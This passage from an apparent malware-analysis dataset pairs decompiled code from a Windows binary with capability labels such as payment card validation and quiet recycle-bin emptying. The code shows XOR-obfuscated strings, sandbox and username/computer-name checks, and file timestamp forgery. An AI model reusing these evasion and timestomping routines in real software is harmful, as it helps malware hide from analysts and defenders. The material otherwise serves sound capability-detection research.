            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00405c35(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t dwSize;\n    \n    iVar2 = fcn.00405af2(&var_24h, &dwSize);\n    var_28h = 0;\n    if ((iVar2 == 0) &&\n       (arg_8h_00 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4),  iVar2 = var_20h,  iVar4 = dwSize, \n       uVar5 = var_24h,  var_10h = arg_8h_00,  arg_8h_00 != 0)) {\n        do {\n            var_1ch = uVar5;\n            var_18h = iVar2;\n            dwSize = arg_8h_00;\n            fcn.0040509e(arg_8h_00, 0x1000);\n            iVar1 = var_10h;\n            arg_8h_00 = dwSize + 0x1000;\n            var_1ch = uVar5 + 0x1000;\n            var_18h = iVar2 + (0xffffefff < uVar5);\n            iVar4 = iVar4 + -0x1000;\n            iVar2 = var_18h;\n            uVar5 = var_1ch;\n        } while (iVar4 != 0);\n        dwSize = arg_8h_00;\n        puVar3 = fcn.004014f8(0x1000);\n        if (puVar3 == NULL) {\n            var_2ch = 0;\n        }\n        else {\n            var_2ch = *puVar3 + var_24h;\n            var_28h = var_20h + CARRY4(*puVar3, var_24h);\n        }\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(iVar1, 0, 0x8000);\n    }\n    else {\n        var_2ch = 0;\n    }\n    return CONCAT44(var_28h, var_2ch);\n}\n",
        "token_count": 578
    },
    "00403864": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403864(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar7;\n    uint var_ch;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    iVar7 = 0;\n    iVar2 = fcn.004037f2();\n    if (iVar2 != 0) {\n        in_ECX = iVar2;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0x80000000, 1, 0, 3, 0x80, 0);\n    if (iVar3 != -1) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar3, 0);\n        if (iVar4 == 0) {\n            iVar4 = 0xe8;\n            goto code_r0x00403906;\n        }\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar4 + 2);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n        if (iVar7 != 0) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar3, iVar7, iVar4, &lpNumberOfBytesRead, 0);\n            if (iVar5 != 0) {\n                if (iVar4 == lpNumberOfBytesRead) {\n                    *(iVar4 + iVar7) = 0;\n                    *in_EDX = iVar7;\n                    *arg_8h = iVar4;\n                    iVar4 = 0;\n                }\n                else {\n                    iVar4 = 0x1e;\n                }\n                goto code_r0x00403906;\n            }\n        }\n    }\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x00403906:\n    if (iVar3 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    if ((iVar7 != 0) && (iVar4 != 0)) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n        (*pcVar1)(uVar6);\n    }\n    if (iVar2 != 0) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*pcVar1)(uVar6);\n    }\n    return iVar4;\n}\n",
        "token_count": 603
    },
    "00403948": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00403948(uint lpLastWriteTime)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint in_EDX;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_4dh;\n    uint var_49h;\n    uint var_45h;\n    uint var_41h;\n    uint var_3dh;\n    uint var_39h;\n    uint var_35h;\n    uint var_31h;\n    uint var_2dh;\n    uchar var_29h;\n    uint lpSystemTime;\n    uint var_22h;\n    int16_t var_1eh;\n    int16_t var_1ch;\n    int16_t var_1ah;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint lpLastAccessTime;\n    uint lpCreationTime;\n    \n    iVar3 = *0x41cb5c;\n    lpLastAccessTime = in_EDX;\n    (*_sym.imp.KERNEL32.dll_GetSystemTime)(&lpSystemTime);\n    pcVar1 = _sym.imp.KERNEL32.dll_SystemTimeToFileTime;\n    uVar7 = iVar3 * 0x19660d + 0x3c6ef35f;\n    lpSystemTime._2_2_ = uVar7 % 0xb + 1;\n    uVar7 = uVar7 * 0x19660d + 0x3c6ef35f;\n    uVar6 = uVar7 * 0x19660d + 0x3c6ef35f;\n    var_22h._0_2_ = uVar7 % 0x1b + 1;\n    var_22h._2_2_ = uVar6 % 0x16 + 1;\n    uVar7 = uVar6 * 0x19660d + 0x3c6ef35f;\n    uVar6 = uVar7 * 0x19660d + 0x3c6ef35f;\n    var_1eh = uVar7 % 0x3b + 1;\n    var_1ch = uVar6 % 0x3b + 1;\n    lpSystemTime._0_2_ = lpSystemTime + -1;\n    var_1ah = (uVar6 * 0x17385ca9 + 0x47502932) % 0x3e6 + 1;\n    (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime);\n    (*pcVar1)(&lpSystemTime);\n    (*pcVar1)(&lpSystemTime, lpLastWriteTime);\n    var_5ch = 0x451d3449;\n    var_58h = 0x6a5a6c30;\n    var_54h._0_2_ = 0x5921;\n    var_10h = 5;\n    var_54h._2_1_ = 5;\n    stack0xffffffab = 0x7c451834;\n    var_4dh = 0x366a686c;\n    var_49h = 0x19341559;\n    var_45h = 0x516c2d45;\n    var_41h = 0x5f59286a;\n    var_3dh._0_2_ = 0x5834;\n    var_3dh._2_1_ = 0x45;\n    var_39h = 0x286a576c;\n    var_35h = 0x44340859;\n    var_31h = 0x4c6c3c45;\n    var_2dh = 0x6c59206a;\n    var_29h = 0x34;\n    var_18h = 0x456a346c;\n    var_14h._0_1_ = 0x59;\n    var_3dh._3_1_ = var_54h._2_1_;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x69);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar4 != 0xcc3c4b) {\n            *(iVar8 + iVar3) = *(&var_18h + iVar8 % var_10h) ^ (iVar8 + iVar3)[&var_5ch - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x34);\n    iVar8 = fcn.004037f2();\n    if (iVar8 != 0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(iVar8, 0x80000000, 1, 0, 3, 0, 0);\n        if ((iVar4 != 0) && (iVar4 != -1)) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetFileTime)(iVar8, lpCreationTime, lpLastAccessTime, lpLastWriteTime);\n            if (iVar5 == 0) {\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpCreationTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastAccessTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastWriteTime);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return 0;\n}\n",
        "token_count": 1395
    },
    "00403b78": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403b78(uint nNumberOfBytesToWrite)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    uint lpNumberOfBytesWritten;\n    uint lpBuffer;\n    \n    lpBuffer = in_EDX;\n    iVar1 = fcn.004037f2();\n    if (iVar1 != 0) {\n        in_ECX = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0xc0000000, 0, 0, 4, 0x80, 0);\n    if (iVar2 == -1) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        fcn.00403948(&lpLastWriteTime);\n        iVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar2, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n        if (iVar4 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_SetEndOfFile)(iVar2);\n            uVar3 = 0;\n        }\n        (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    if (iVar1 != 0) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    }\n    return uVar3;\n}\n",
        "token_count": 428
    },
    "0040958f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040958f(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    *0x41cb18 = 1;\n    fcn.0040bf7c(param_1);\n    fcn.0040c920();\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(*0x41cb28);\n    if (iVar1 != -1) {\n        fcn.00403f18();\n    }\n    fcn.00409121();\n    (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    fcn.00409031();\n    return;\n}\n",
        "token_count": 137
    },
    "0040af81": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040af81(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (param_1 != 0) {\n        if (param_2 == -1) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, param_2 + 1);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if ((iVar2 != 0) &&\n           (iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, param_2, iVar2, param_2 + 1, 0, 0), \n           iVar3 != 0)) {\n            var_4h = fcn.0040aeb9();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 288
    },
    "0040b32e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040b32e(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar4 = -1;\n    iVar3 = 0;\n    var_10h = param_2 * 10;\n    var_ch = param_1;\n    do {\n        iVar1 = var_10h;\n        var_4h = 0;\n        var_8h = 0;\n        puVar5 = &var_18h;\n        for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        iVar1 = fcn.00401f28(iVar1, 0, &var_8h, &var_4h);\n        if (iVar1 == 0) {\n            if (var_4h == var_8h) {\n                if (var_18h == 4) {\n                    iVar4 = *var_14h;\n                }\n                fcn.00408e0c();\n            }\n            if (iVar4 != -1) {\n                return iVar4;\n            }\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n        }\n        iVar3 = iVar3 + 1;\n        if (4 < iVar3) {\n            return iVar4;\n        }\n    } while( true );\n}\n",
        "token_count": 400
    },
    "00407f43": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00407f43(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint8_t *extraout_ECX;\n    uint8_t *extraout_ECX_00;\n    uint8_t *extraout_ECX_01;\n    uint8_t *puVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    uint var_d8h;\n    uint var_d4h;\n    uint pcbBuffer;\n    int32_t var_cch;\n    int32_t var_c8h;\n    int32_t var_c4h;\n    int32_t var_c0h;\n    int32_t var_bch;\n    int32_t var_b8h;\n    int32_t var_b4h;\n    int32_t var_b0h;\n    uint var_ach;\n    int32_t var_a8h;\n    uint var_a4h;\n    int32_t var_a0h;\n    uint var_9ch;\n    int32_t var_98h;\n    uint var_94h;\n    int32_t var_90h;\n    uint var_8ch;\n    int32_t var_88h;\n    uint var_84h;\n    int32_t var_80h;\n    uint var_7ch;\n    int32_t var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uchar var_64h;\n    uchar var_63h;\n    uint var_62h;\n    ushort var_5eh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    ushort var_48h;\n    uchar var_46h;\n    uint var_45h;\n    uchar var_41h;\n    ushort uStack68;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.00407d86();\n    if (iVar4 != 0) {\n        fcn.00407f2b();\n    }\n    var_14h._0_1_ = 0x3c;\n    var_14h._1_1_ = 0x50;\n    var_14h._2_2_ = 0x3808;\n    var_10h._0_2_ = 0x341d;\n    var_10h._2_1_ = 0x42;\n    var_10h._3_1_ = 0x41;\n    var_ch = 0x32341434;\n    var_98h = 0x506f3258;\n    var_94h._0_1_ = 0x78;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    var_3ch = 5;\n    iVar11 = 0;\n    var_2ch = &var_14h - iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar6 != 0x106128) {\n            *(iVar11 + iVar4) = *(&var_98h + iVar11 % var_3ch) ^ (iVar11 + iVar4)[&var_14h - iVar4];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0xc);\n    iVar11 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar11 != 0) {\n        fcn.00407f2b();\n    }\n    var_14h._0_1_ = 0x26;\n    var_14h._1_1_ = 0x38;\n    var_14h._2_2_ = 0x153e;\n    var_10h._0_2_ = 0x3c1e;\n    var_10h._2_1_ = 0x39;\n    var_10h._3_1_ = 0x74;\n    var_ch = 0x50161c33;\n    var_b0h = 0x70575a55;\n    var_ach._0_2_ = 0x507a;\n    uVar5 = (*pcVar2)(8, 0xd);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    var_38h = 6;\n    iVar6 = 0;\n    var_98h = iVar11;\n    var_2ch = &var_14h - iVar11;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        if (iVar7 != 0x32ffa6) {\n            *(iVar6 + iVar11) = *(&var_b0h + iVar6 % var_38h) ^ (iVar6 + iVar11)[&var_14h - iVar11];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xc);\n    iVar11 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar11);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar11 != 0) {\n        fcn.00407f2b();\n    }\n    pcbBuffer = 0x400;\n    iVar11 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(0x41cdf0, &pcbBuffer);\n    if (iVar11 == 0) {\n        fcn.00407f2b();\n    }\n    var_14h._0_1_ = 0x7b;\n    var_14h._1_1_ = 0x22;\n    var_14h._2_2_ = 0x3142;\n    var_10h._0_2_ = 0x561d;\n    var_10h._2_1_ = 0x23;\n    var_10h._3_1_ = 0x65;\n    var_ch = 0x574a1d30;\n    var_90h = 0x43305738;\n    var_8ch._0_1_ = 0x78;\n    uVar5 = (*pcVar2)(8, 0xd);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_2ch = &var_14h - iVar11;\n    var_b0h = iVar11;\n    do {\n        iVar7 = (*pcVar2)();\n        if (iVar7 != 0x96c9fc) {\n            *(iVar6 + iVar11) = *(&var_90h + iVar6 % var_3ch) ^ (iVar6 + iVar11)[var_2ch];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xc);\n    iVar11 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41cdf0, iVar11);\n    if (iVar11 == 0) {\n        fcn.00407f2b();\n    }\n    var_10h._0_2_ = 0x3262;\n    var_10h._2_1_ = 0x3d;\n    var_10h._3_1_ = 0x55;\n    var_ch = 0x532b5e11;\n    var_88h = 0x31535331;\n    var_84h._0_1_ = 0x73;\n    uVar5 = (*pcVar2)(8, 9);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_90h = iVar11;\n    var_2ch = &var_10h - iVar11;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n        if (iVar7 != 0xb057fa) {\n            *(iVar6 + iVar11) = *(&var_88h + iVar6 % var_3ch) ^ (iVar6 + iVar11)[&var_10h - iVar11];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 8);\n    iVar11 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41cdf0, iVar11);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar11 == 0) {\n        fcn.00407f2b();\n    }\n    pcbBuffer = 0x400;\n    iVar11 = (*_sym.imp.KERNEL32.dll_GetComputerNameA)(0x41cdf0, &pcbBuffer);\n    if (iVar11 == 0) {\n        fcn.00407f2b();\n    }\n    var_10h._0_2_ = 0x1507;\n    var_10h._2_1_ = 0x7a;\n    var_10h._3_1_ = 0x3e;\n    var_ch = 0x340c1b0b;\n    var_80h = 0x7a345454;\n    var_7ch._0_1_ = 0x49;\n    uVar5 = (*pcVar2)(8, 9);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_88h = iVar11;\n    var_2ch = &var_10h - iVar11;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar7 != 0x8aa51c) {\n            *(iVar6 + iVar11) = *(&var_80h + iVar6 % var_3ch) ^ (iVar6 + iVar11)[&var_10h - iVar11];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 8);\n    iVar11 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41cdf0, iVar11);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar11 == 0) {\n        fcn.00407f2b();\n    }\n    var_10h._0_2_ = 0x6a45;\n    var_10h._2_1_ = 0x19;\n    var_10h._3_1_ = 0x3b;\n    var_ch = 0x50783b2e;\n    var_8h = 0x77503972;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x78);\n    uVar5 = (*pcVar2)(8, 9);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_80h = iVar11;\n    var_2ch = &var_10h - iVar11;\n    do {\n        iVar7 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar7 != 0x8ca89e) {\n            *(iVar6 + iVar11) = *(&var_8h + iVar6 % var_3ch) ^ (iVar6 + iVar11)[&var_10h - iVar11];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 8);\n    iVar11 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41cdf0, iVar11);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar11 == 0) {\n        fcn.00407f2b();\n    }\n    var_5ch._0_2_ = 0x2c2b;\n    var_5ch._2_2_ = 0xd0a;\n    var_58h._0_2_ = 0x2211;\n    var_58h._2_2_ = 0x1d3f;\n    var_54h._0_2_ = 0x215;\n    var_54h._2_2_ = 0x3e26;\n    var_50h._0_2_ = 0x1b1b;\n    var_50h._2_1_ = 0xf;\n    var_50h._3_1_ = 0x33;\n    var_4ch._0_2_ = 0x1139;\n    var_4ch._2_1_ = 6;\n    var_4ch._3_1_ = 8;\n    var_48h = 0x3e3f;\n    var_46h = 0x21;\n    var_45h._0_1_ = 0x3a;\n    var_45h._1_1_ = 0x32;\n    var_45h._3_1_ = 0;\n    var_41h = 0x58;\n    var_8h = 0x49586d63;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x46);\n    var_45h._2_1_ = var_4ch._2_1_;\n    uVar5 = (*pcVar2)(8, 0x1d);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_2ch = &var_5ch - iVar11;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar7 != 0xaa8c11) {\n            *(iVar6 + iVar11) = *(&var_8h + iVar6 % var_3ch) ^ (iVar6 + iVar11)[&var_5ch - iVar11];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x1c);\n    var_1ch = 0x233a2962;\n    var_18h = 0x39732915;\n    var_14h._0_1_ = 0x26;\n    var_14h._1_1_ = 0x24;\n    var_14h._2_2_ = 0x2126;\n    var_10h._0_2_ = 0x2343;\n    var_10h._2_1_ = 0x20;\n    var_10h._3_1_ = 0x38;\n    var_ch = CONCAT22(var_ch._2_2_, 0x441e);\n    var_8h = 0x57495031;\n    var_4h._0_2_ = 0x4470;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_cch = &var_1ch - iVar6;\n    var_2ch = iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        puVar9 = extraout_ECX;\n        if (iVar8 != 0x7ca524) {\n            puVar9 = iVar7 + iVar6;\n            *puVar9 = *(&var_8h + iVar7 % var_38h) ^ puVar9[&var_1ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x12);\n    cVar3 = fcn.00407d2a(puVar9, puVar9);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar3 == '\\0') {\n        fcn.00407f2b();\n    }\n    var_8h = 0x653c3512;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x76);\n    var_28h = 0x45757853;\n    var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x76);\n    uVar5 = (*pcVar2)(8, 6);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_cch = iVar6;\n    var_c8h = &var_8h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_DestroyCaret)();\n        if (iVar8 != 0x30abe2) {\n            *(iVar7 + iVar6) = *(&var_28h + iVar7 % var_3ch) ^ (iVar7 + iVar6)[&var_8h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 5);\n    var_28h = 0x23091b0f;\n    var_24h._0_2_ = 0x4d27;\n    var_8h = 0x6b4a544d;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x74);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 7);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_c8h = iVar6;\n    var_c4h = &var_28h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        if (iVar8 != 0xe573bc) {\n            *(iVar7 + iVar6) = *(&var_8h + iVar7 % var_3ch) ^ (iVar7 + iVar6)[&var_28h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 6);\n    var_8h = 0x3b163a62;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x72);\n    var_28h = 0x63597834;\n    var_24h._0_2_ = 0x6e72;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_c4h = iVar6;\n    var_c0h = &var_8h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar8 != 0xe5c61a) {\n            *(iVar7 + iVar6) = *(&var_28h + iVar7 % var_38h) ^ (iVar7 + iVar6)[&var_8h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 5);\n    var_8h = 0x677e1c1e;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x44);\n    var_28h = 0x3233594f;\n    var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x44);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_c0h = iVar6;\n    var_bch = &var_8h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar8 != 0xe4a7bb) {\n            *(iVar7 + iVar6) = *(&var_28h + iVar7 % var_3ch) ^ (iVar7 + iVar6)[&var_8h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 5);\n    var_8h = 0x2b070c3d;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x6f);\n    var_28h = 0x6244416e;\n    var_24h._0_2_ = 0x4a6f;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_bch = iVar6;\n    var_b8h = &var_8h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n        if (iVar8 != 0xdb1ce5) {\n            *(iVar7 + iVar6) = *(&var_28h + iVar7 % var_38h) ^ (iVar7 + iVar6)[&var_8h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 5);\n    var_1ch = 0x77330a3c;\n    var_18h = 0x4a645502;\n    var_14h._0_1_ = 0x12;\n    var_14h._1_1_ = 0x78;\n    var_14h._2_2_ = 0x7045;\n    var_10h._0_2_ = 599;\n    var_10h._2_1_ = 0x7e;\n    var_10h._3_1_ = 0x45;\n    var_ch = CONCAT31(var_ch._1_3_, 0x44);\n    var_8h = 0x32674475;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x4e);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_b8h = iVar6;\n    var_b4h = &var_1ch - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar8 != 